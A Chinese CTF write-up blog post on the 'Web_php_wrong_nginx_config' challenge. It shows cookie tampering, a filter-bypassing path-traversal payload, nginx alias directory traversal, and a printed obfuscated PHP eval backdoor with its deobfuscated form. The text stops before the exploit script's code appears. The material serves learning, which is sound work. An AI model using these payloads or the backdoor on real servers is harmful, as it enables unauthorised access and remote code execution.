<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Web_php_wrong_nginx_config | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>Web_php_wrong_nginx_config</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-10-15T06:20:21.878Z" id="date"> 2023-10-15</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-10-15T07:35:14.328Z" id="updated"> 2023-10-15</time></div></span><br><span>文章总字数: <div class="control">2.3k</div></span><br><span>预计阅读时间: <div class="control">12 分钟</div></span></div></div><hr><div id="post-content"><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2>
<p>无</p>
<h2 id="题目解题"><a href="#题目解题" class="headerlink" title="题目解题"></a>题目解题</h2>
<p class='item-img' data-src='image-20231015143347295.png'><img src="image-20231015143347295.png" alt="image-20231015143347295"></p>
<p>访问首页是一个登录框，弱口令试了没什么效果，直接扫一下目录看看</p>
<p class='item-img' data-src='image-20231015143418695.png'><img src="image-20231015143418695.png" alt="image-20231015143418695"></p>
<p>发现robots.txt，发现两个php文件，访问看看</p>
<p class='item-img' data-src='image-20231015143517918.png'><img src="image-20231015143517918.png" alt="image-20231015143517918"></p>
<p>提示配置文件有问题，估计得想办法读取一下。随后访问hack.php，但必须要登录才可以，那回到登录框再看一下，结果还是没啥思路，于是看了一眼wp发现可以访问hack.php，只不过我当时眼瞎没看到。</p>
<p>我们url拼接hack.php，然后bp抓包</p>
<p class='item-img' data-src='image-20231015144318324.png'><img src="image-20231015144318324.png" alt="image-20231015144318324"></p>
<p>如上图看到cookie值很可疑，猜测修改一下就可以的登录，尝试一下</p>
<p class='item-img' data-src='image-20231015144347727.png'><img src="image-20231015144347727.png" alt="image-20231015144347727"></p>
<p>页面成功有回显，然后就没有然后了，看了wp发现似乎要一个一个链接的去测试</p>
<p>如下图，这里我是抓包后修改cookie后放包（先放一下），随后看wp的意思他是直接点击管理中心抓包的，但实战的话肯定不清楚的，因此我们得一个个去点击测试抓包。</p>
<p>（不过看了wp发现这里可以查看源码或者是F12看查看器，观察哪个连接有跳转功能来针对性的抓包）</p>
<p>这里就直接抓了，抓了之后还是放包看有什么信息（记得修改cookie）</p>
<p>放了两次后发现如下图，出现可以url参数，这里可以试着读取一下之前的配置文件</p>
<p class='item-img' data-src='image-20231015144842116.png'><img src="image-20231015144842116.png" alt="image-20231015144842116"></p>
<p>读取试了试没效果（此处并没有想到被过滤了）看了wp发现…/被过滤，但我真不知道咋测试出来的。。。估计是一个个试的吧</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?file=index.php&amp;ext=和?file=index&amp;ext=php内容读取一样<br></code></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?file=....//....//....//....///etc/nginx/sites-enabled/site.conf&amp;ext=<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231015150228720.png'><img src="image-20231015150228720.png" alt="image-20231015150228720"></p>
<p>成功读取，这里咱也不知道如何一键格式化代码，就cv了，接下来就只能傻傻的看wp了┭┮﹏┭┮</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs php">server &#123;<br>    listen <span class="hljs-number">8080</span>; <span class="hljs-comment">## listen for ipv4; this line is default and implied</span><br>    listen [::]:<span class="hljs-number">8080</span>; <span class="hljs-comment">## listen for ipv6</span><br><br>    root /<span class="hljs-keyword">var</span>/www/html;<br>    index index.php index.html index.htm;<br>    port_in_redirect off;<br>    server_name _;<br><br>    <span class="hljs-comment"># Make site accessible from http://localhost/</span><br>    <span class="hljs-comment">#server_name localhost;</span><br><br>    <span class="hljs-comment"># If block for setting the time for the logfile</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$time_iso8601</span> ~ <span class="hljs-string">&quot;^(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)&quot;</span>) &#123;<br>       set <span class="hljs-variable">$year</span> $<span class="hljs-number">1</span>;<br>       set <span class="hljs-variable">$month</span> $<span class="hljs-number">2</span>;<br>       set <span class="hljs-variable">$day</span> $<span class="hljs-number">3</span>;<br>    &#125;<br>    <span class="hljs-comment"># Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html</span><br>    sendfile off;<br><br>        set <span class="hljs-variable">$http_x_forwarded_for_filt</span> <span class="hljs-variable">$http_x_forwarded_for</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$http_x_forwarded_for_filt</span> ~ ([<span class="hljs-number">0</span>-<span class="hljs-number">9</span>]+\.[<span class="hljs-number">0</span>-<span class="hljs-number">9</span>]+\.[<span class="hljs-number">0</span>-<span class="hljs-number">9</span>]+\.)[<span class="hljs-number">0</span>-<span class="hljs-number">9</span>]+) &#123;<br>                set <span class="hljs-variable">$http_x_forwarded_for_filt</span> $<span class="hljs-number">1</span>???;<br>        &#125;<br><br>    <span class="hljs-comment"># Add stdout logging</span><br><br>    access_log /<span class="hljs-keyword">var</span>/log/nginx/<span class="hljs-variable">$hostname</span>-access-<span class="hljs-variable">$year</span>-<span class="hljs-variable">$month</span>-<span class="hljs-variable">$day</span>.log openshift_log;<br>    error_log /<span class="hljs-keyword">var</span>/log/nginx/error.log info;<br><br>    location / &#123;<br>        <span class="hljs-comment"># First attempt to serve request as file, then</span><br>        <span class="hljs-comment"># as directory, then fall back to index.html</span><br>        try_files <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ /index.php?q=<span class="hljs-variable">$uri</span>&amp;<span class="hljs-variable">$args</span>;<br>        server_tokens off;<br>    &#125;<br><br>    <span class="hljs-comment">#error_page 404 /404.html;</span><br><br>    <span class="hljs-comment"># redirect server error pages to the static page /50x.html</span><br>    <span class="hljs-comment">#</span><br>    error_page <span class="hljs-number">500</span> <span class="hljs-number">502</span> <span class="hljs-number">503</span> <span class="hljs-number">504</span> /<span class="hljs-number">50</span>x.html;<br>    location = /<span class="hljs-number">50</span>x.html &#123;<br>        root /usr/share/nginx/html;<br>    &#125;<br>    location ~ \.php$ &#123;<br>        try_files <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ /index.php?q=<span class="hljs-variable">$uri</span>&amp;<span class="hljs-variable">$args</span>;<br>        fastcgi_split_path_info ^(.+\.php)(/.+)$;<br>        fastcgi_pass unix:/<span class="hljs-keyword">var</span>/run/php/php5.<span class="hljs-number">6</span>-fpm.sock;<br>        fastcgi_param SCRIPT_FILENAME <span class="hljs-variable">$document</span>_root<span class="hljs-variable">$fastcgi_script_name</span>;<br>        fastcgi_param SCRIPT_NAME <span class="hljs-variable">$fastcgi_script_name</span>;<br>        fastcgi_index index.php;<br>        <span class="hljs-keyword">include</span> fastcgi_params;<br>        fastcgi_param REMOTE_ADDR <span class="hljs-variable">$http_x_forwarded_for</span>;<br>    &#125;<br><br>    location ~ /\. &#123;<br>            log_not_found off;<br>            deny all;<br>    &#125;<br>    location /web-img &#123;<br>        alias /images/;<br>        autoindex on;<br>    &#125;<br>    location ~* \.(ini|docx|pcapng|doc)$ &#123;  <br>         deny all;  <br>    &#125;  <br><br>    <span class="hljs-keyword">include</span> /<span class="hljs-keyword">var</span>/www/nginx[.]conf;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>nginx配置</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">location /web-img &#123;<br>    alias /images/;<br>    autoindex on;<br>&#125;<br>这是开发人员想让我们访问/web-img这个目录，但是没有在/web-img后面加/,导致我们可以构造/web-img../<br>和alisa拼接起来就成了/images/web-img/../,造成目录穿越漏洞<br></code></pre></td></tr></table></figure>
<p>访问/web-img…/目录</p>
<p class='item-img' data-src='image-20231015151353453.png'><img src="image-20231015151353453.png" alt="image-20231015151353453"></p>
<p>进入网站目录发现有备份文件，下载一下</p>
<p class='item-img' data-src='image-20231015151448071.png'><img src="image-20231015151448071.png" alt="image-20231015151448071"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$U</span>=<span class="hljs-string">&#x27;_/|U&quot;,&quot;/-/|U&quot;),ar|Uray|U(&quot;/|U&quot;,&quot;+&quot;),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle&#x27;</span>;<br><span class="hljs-variable">$q</span>=<span class="hljs-string">&#x27;s[|U$i]=&quot;&quot;;$p=|U$ss($p,3);&#125;|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s))&#123;$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui&#x27;</span>;<br><span class="hljs-variable">$M</span>=<span class="hljs-string">&#x27;l=&quot;strtolower|U&quot;;$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$&#x27;</span>;<br><span class="hljs-variable">$z</span>=<span class="hljs-string">&#x27;r=@$r[|U&quot;HTTP_R|UEFERER|U&quot;];$r|U|Ua=@$r[&quot;HTTP_A|U|UCCEPT_LAN|UGUAGE|U&quot;];if|U($r|Ur&amp;|U&amp;$ra)&#123;$u=parse_|Uurl($r&#x27;</span>;<br><span class="hljs-variable">$k</span>=<span class="hljs-string">&#x27;?:;q=0.([\\|Ud]))?,|U?/&quot;,$ra,$m)|U;if($|Uq&amp;&amp;$m)&#123;|U|U|U@session_start()|U|U;$s=&amp;$_SESSIO|UN;$ss=&quot;|Usubst|Ur&quot;;|U|U$s&#x27;</span>;<br><span class="hljs-variable">$o</span>=<span class="hljs-string">&#x27;|U$l;|U)&#123;for|U($j=0;($j|U&lt;$c&amp;&amp;|U|U$i|U&lt;$|Ul);$j++,$i++)&#123;$o.=$t&#123;$i&#125;|U^$k|U&#123;$j&#125;;&#125;&#125;|Ureturn $|Uo;&#125;$r=$|U_SERV|UE|UR;$r&#x27;</span>;<br><span class="hljs-variable">$N</span>=<span class="hljs-string">&#x27;|Uf($e)&#123;$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray(&quot;/&#x27;</span>;<br><span class="hljs-variable">$C</span>=<span class="hljs-string">&#x27;an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut(&quot;|U&lt;$k&gt;$d&lt;/$k&gt;&quot;|U);@ses|U|Usion_des|Utroy();&#125;&#125;&#125;&#125;&#x27;</span>;<br><span class="hljs-variable">$j</span>=<span class="hljs-string">&#x27;$k|Uh=&quot;|U|U42f7&quot;;$kf=&quot;e9ac&quot;;fun|Uction|U |Ux($t,$k)&#123;$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U&quot;&quot;;fo|Ur($i=0;$i&lt;&#x27;</span>;<br><span class="hljs-variable">$R</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;rO&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;rOcreatrOe_rOrOfurOncrOtion&#x27;</span>);<br><span class="hljs-variable">$J</span>=<span class="hljs-string">&#x27;kf|U),|U0,3));$p=&quot;|U&quot;;for(|U|U$|Uz=1;$z&lt;cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0)&#123;$&#x27;</span>;<br><span class="hljs-variable">$x</span>=<span class="hljs-string">&#x27;r)|U;pa|Urse|U_str($u[&quot;qu|U|Uery&quot;],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul(&quot;/([\\|U|Uw])[|U\\w-]+|U(&#x27;</span>;<br><span class="hljs-variable">$f</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;|U&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$j</span>.<span class="hljs-variable">$o</span>.<span class="hljs-variable">$z</span>.<span class="hljs-variable">$x</span>.<span class="hljs-variable">$k</span>.<span class="hljs-variable">$M</span>.<span class="hljs-variable">$J</span>.<span class="hljs-variable">$q</span>.<span class="hljs-variable">$N</span>.<span class="hljs-variable">$U</span>.<span class="hljs-variable">$C</span>);<br><span class="hljs-variable">$g</span>=<span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$f</span>);<br><span class="hljs-variable">$g</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">create_function()函数<br><br>根据传递的参数创建匿名函数，并为其返回唯一名称。<br><br>语法：<br><br>1 create_function(string $args,string $code)<br>2 string $args 声明的函数变量部分<br>3 string $code 执行的方法代码部分<br></code></pre></td></tr></table></figure>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/12980483.html">PHP代码审计之create_function()函数</a></p>
<p>这里大佬说感觉是PHP混淆，随后他直接输出了f变量看到了代码部分</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$kh</span> = <span class="hljs-string">&quot;42f7&quot;</span>;<br><span class="hljs-variable">$kf</span> = <span class="hljs-string">&quot;e9ac&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">x</span>(<span class="hljs-params"><span class="hljs-variable">$t</span>, <span class="hljs-variable">$k</span></span>) </span>&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$k</span>);<br>    <span class="hljs-variable">$l</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$t</span>);<br>    <span class="hljs-variable">$o</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$l</span>;) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span> = <span class="hljs-number">0</span>;<br>            (<span class="hljs-variable">$j</span> &lt; <span class="hljs-variable">$c</span> &amp;&amp; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$l</span>); <span class="hljs-variable">$j</span>++, <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$o</span>. = <span class="hljs-variable">$t</span> &#123;<br>                <span class="hljs-variable">$i</span><br>            &#125; ^ <span class="hljs-variable">$k</span> &#123;<br>                <span class="hljs-variable">$j</span><br>            &#125;;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$o</span>;<br>&#125;<br><span class="hljs-variable">$r</span> = <span class="hljs-variable">$_SERVER</span>;<br><span class="hljs-variable">$rr</span> = @<span class="hljs-variable">$r</span>[<span class="hljs-string">&quot;HTTP_REFERER&quot;</span>];<br><span class="hljs-variable">$ra</span> = @<span class="hljs-variable">$r</span>[<span class="hljs-string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$rr</span> &amp;&amp; <span class="hljs-variable">$ra</span>) &#123;<br>    <span class="hljs-variable">$u</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$rr</span>);<br>    <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$u</span>[<span class="hljs-string">&quot;query&quot;</span>], <span class="hljs-variable">$q</span>);<br>    <span class="hljs-variable">$q</span> = <span class="hljs-title function_ invoke__">array_values</span>(<span class="hljs-variable">$q</span>);<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>, <span class="hljs-variable">$ra</span>, <span class="hljs-variable">$m</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$q</span> &amp;&amp; <span class="hljs-variable">$m</span>) &#123;@<br>        <span class="hljs-title function_ invoke__">session_start</span>();<br>        <span class="hljs-variable">$s</span> = &amp; <span class="hljs-variable">$_SESSION</span>;<br>        <span class="hljs-variable">$ss</span> = <span class="hljs-string">&quot;substr&quot;</span>;<br>        <span class="hljs-variable">$sl</span> = <span class="hljs-string">&quot;strtolower&quot;</span>;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>].<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br>        <span class="hljs-variable">$h</span> = <span class="hljs-variable">$sl</span>(<span class="hljs-variable">$ss</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$i</span>.<span class="hljs-variable">$kh</span>), <span class="hljs-number">0</span>, <span class="hljs-number">3</span>));<br>        <span class="hljs-variable">$f</span> = <span class="hljs-variable">$sl</span>(<span class="hljs-variable">$ss</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$i</span>.<span class="hljs-variable">$kf</span>), <span class="hljs-number">0</span>, <span class="hljs-number">3</span>));<br>        <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$z</span> = <span class="hljs-number">1</span>; <span class="hljs-variable">$z</span> &lt; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>]); <span class="hljs-variable">$z</span>++) <span class="hljs-variable">$p</span>. = <span class="hljs-variable">$q</span>[<span class="hljs-variable">$m</span>[<span class="hljs-number">2</span>][<span class="hljs-variable">$z</span>]];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$p</span>, <span class="hljs-variable">$h</span>) === <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-variable">$p</span> = <span class="hljs-variable">$ss</span>(<span class="hljs-variable">$p</span>, <span class="hljs-number">3</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-variable">$i</span>, <span class="hljs-variable">$s</span>)) &#123;<br>            <span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]. = <span class="hljs-variable">$p</span>;<br>            <span class="hljs-variable">$e</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>], <span class="hljs-variable">$f</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$e</span>) &#123;<br>                <span class="hljs-variable">$k</span> = <span class="hljs-variable">$kh</span>.<span class="hljs-variable">$kf</span>;<br>                <span class="hljs-title function_ invoke__">ob_start</span>();@<br>                <span class="hljs-keyword">eval</span>(@<span class="hljs-title function_ invoke__">gzuncompress</span>(@<span class="hljs-title function_ invoke__">x</span>(@<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;/_/&quot;</span>, <span class="hljs-string">&quot;/-/&quot;</span>), <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>), <span class="hljs-variable">$ss</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>], <span class="hljs-number">0</span>, <span class="hljs-variable">$e</span>))), <span class="hljs-variable">$k</span>)));<br>                <span class="hljs-variable">$o</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>                <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>                <span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">x</span>(<span class="hljs-title function_ invoke__">gzcompress</span>(<span class="hljs-variable">$o</span>), <span class="hljs-variable">$k</span>));<br>                <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;<span class="hljs-subst">$k</span>&gt;<span class="hljs-subst">$d</span>&lt;/<span class="hljs-subst">$k</span>&gt;&quot;</span>);@<br>                <span class="hljs-title function_ invoke__">session_destroy</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>到这里更一脸懵逼了，看wp说</p>
<p>这是一个后门页面,在网上找到了相关的利用教程:<br>
<a target="_blank" rel="noopener" href="https://www.cnblogs.com/go2bed/p/5920811.html">一个PHP混淆后门的分析</a><br>
根据题目修改后的脚本(修改了密钥和url)如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span 